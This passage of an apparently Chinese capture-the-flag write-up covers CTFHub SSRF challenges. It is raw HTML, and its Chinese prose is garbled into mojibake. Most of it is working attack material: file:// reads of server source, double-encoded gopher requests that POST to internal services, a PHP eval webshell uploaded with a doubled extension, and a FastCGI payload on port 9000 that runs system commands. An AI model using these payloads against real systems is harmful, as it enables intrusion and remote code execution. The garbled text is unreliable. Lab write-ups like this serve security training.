class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure></li></ul><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ul><li>é¢˜ç›®æ„æ€æ˜¯è¦æ„é€ ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œä¼ å‚key</li></ul><p>è®¿é—®<code>http://127.0.0.1/flag.php</code> å‘ç°</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=21327983b7a37abf3ace93cc0e64f15f--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œé¦–å…ˆæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡ URLè§£ç ï¼Œå…¶æ¬¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåœ¨æ‰§è¡ŒcurlåŠŸèƒ½æ—¶ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ URLè§£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¤æ¬¡ç¼–ç </p><ul><li><p><strong>æ„é€ gopheråè®®</strong></p><ul><li>åœ¨gopheråè®®ä¸­å‘é€HTTPçš„æ•°æ®ï¼Œéœ€è¦ä»¥ä¸‹ä¸‰æ­¥ï¼š</li></ul><p>1ã€æ„é€ HTTPæ•°æ®åŒ…</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.æ„é€ HTTPæ•°æ®åŒ…</span></span><br><span class="line">raw = <span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">key=21327983b7a37abf3ace93cc0e64f15f&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a</span></span><br><span class="line">data = raw.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(data))</span><br></pre></td></tr></table></figure><p>3ã€å‘é€gopheråè®®ï¼Œæœ‰çš„æ•™ç¨‹è¯´åé¢è¦åŠ ç»“æŸç¬¦<code>%0d%0a</code>ï¼Œä½†æ˜¯è¿™é“é¢˜è²Œä¼¼ä¸ç”¨</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253D21327983b7a37abf3ace93cc0e64f15f</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-f2d0d9c7e78f56ec.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>ç»“æœ</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:48 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>206</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line">  </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 10 Apr 2023 07:44:43 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line">  </span><br><span class="line">ctfhub&#123;dbcc1a3f4c6fb16d610f70aa&#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="ä¸Šä¼ æ–‡ä»¶">ä¸Šä¼ æ–‡ä»¶</span></h4><ol><li>æŸ¥çœ‹æºä»£ç </li></ol><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>å‘é€</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?url=file:///var/www/html/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>è¿”å›</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥æ˜¯è¦æ„é€ ä¸€ä¸ªè¡¨å•æäº¤ã€‚</p><ol start="2"><li>ä½¿ç”¨httpåè®®ï¼Œè®¿é—®flag.php</li></ol>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶æ²¡æœ‰æäº¤çš„buttonï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å†™ä¸€ä¸ª</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åbpæŠ“åŒ…</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>330</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqNWrH2XOYKqFjQzw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://challenge-eff97dea17259597.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.pphphp&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Ã¦ÂÂÃ¤ÂºÂ¤</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>  ç¼–ç ä¸¤æ¬¡ç»“æœ</p>  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gohper://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520330%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Macintosh%253B%2520Intel%2520Mac%2520OS%2520X%252010_15_7%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-eff97dea17259597.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell.pphphp%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2527shell%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryqNWrH2XOYKqFjQzw--</span><br></pre></td></tr></table></figure><p>è®¿é—®index.phpæŠ“åŒ…ï¼Œæ„é€ payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">ä¸çŸ¥é“ä¸ºå•¥è¿‡ä¸äº†ï¼Œå’Œç½‘ä¸Šæµç¨‹éƒ½ä¸€æ ·ï¼Œä¸ç®¡</span><br><span class="line"></span><br><span class="line">#### fastcgi</span><br><span class="line"></span><br><span class="line">- è¿™é‡Œè¦ç”¨åˆ°**gopherus**ç±»è¿›è¡Œpayloadç”Ÿæˆ</span><br><span class="line"></span><br><span class="line">  ```cmd</span><br><span class="line">  python2 gopherus --exploit fastcgi</span><br><span class="line">  /var/www/html/index.php</span><br><span class="line">  ls</span><br><span class="line">  # è·å¾—</span><br><span class="line">  gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><p>  ç„¶åå†è¿›è¡Œä¸€æ¬¡urlç¼–ç <br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 